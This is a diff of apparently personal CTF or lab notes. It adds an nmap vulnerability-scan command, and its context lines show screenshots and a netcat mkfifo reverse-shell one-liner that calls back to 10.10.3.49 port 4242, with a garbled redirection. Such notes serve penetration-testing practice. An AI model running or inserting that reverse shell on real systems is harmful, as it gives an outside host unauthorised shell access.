@@ -1,4 +1,5 @@
   
+sudo nmap -v -A -sC --script vuln -p-
 ![7bf4b0916aefc52bb528163adc713ccf.png](resources/7bf4b0916aefc52bb528163adc713ccf.png)
 
 sudo nmap -v -A -sC --script vuln -p- (TARGETIP)  
@@ -37,3 +38,4 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>61|nc 10.10.3.49 4242 >/tmp/f
 ![3c435f30cbc03093655556052493a61d.png](resources/3c435f30cbc03093655556052493a61d.png)
 
 ![d8ab0475aad3825130f0a747934c88a0.png](resources/d8ab0475aad3825130f0a747934c88a0.png)
+Thank you
